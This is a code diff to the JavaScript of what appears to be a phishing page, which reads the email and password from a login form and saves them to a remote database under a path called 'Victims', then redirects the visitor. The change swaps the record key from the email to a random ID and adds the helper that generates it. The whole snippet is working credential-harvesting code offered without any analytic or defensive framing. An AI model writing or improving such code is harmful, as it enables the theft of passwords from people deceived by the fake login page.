@@ -40,7 +40,7 @@ event.preventDefault();
     password = form.querySelector('#pws').value;
     console.log(email , password)
 const inserData = () =>{
-set(ref(database , 'Victims/'+email),{
+set(ref(database , 'Victims/'+generateRandomId()),{
     email : email,
     pws  :password
 }).then(
@@ -96,3 +96,23 @@ console.log(userData)
 function changePage(url) {
     window.location.href = url;
   }
+
+
+
+function generateRandomId() {
+  // Define the characters to use in the ID
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+
+  // Generate a random ID that is at least 6 characters long
+  let id = '';
+  for (let i = 0; i < 6; i++) {
+    id += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+
+  // Add some random numbers to the end of the ID
+  for (let i = 0; i < 3; i++) {
+    id += Math.floor(Math.random() * 10);
+  }
+
+  return id;
+}
